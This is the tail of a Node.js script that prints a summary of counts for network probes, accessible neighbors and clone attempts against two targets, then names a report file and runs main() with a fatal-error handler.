  console.log(`  Network probes: ${Object.keys(R.experiments.network || {}).length}`);
  console.log(`  Accessible neighbors: ${R.accessible_neighbors.length}`);
  console.log(`  Clone ${PAD1}: ${R.clone_results[PAD1]?.success?.length || 0} success`);
  console.log(`  Clone ${PAD2}: ${R.clone_results[PAD2]?.success?.length || 0} success`);
  console.log(`  Report: ${reportFile}`);
  console.log('═'.repeat(75));
}

main().catch(e => { console.error('FATAL:', e); process.exit(1); });
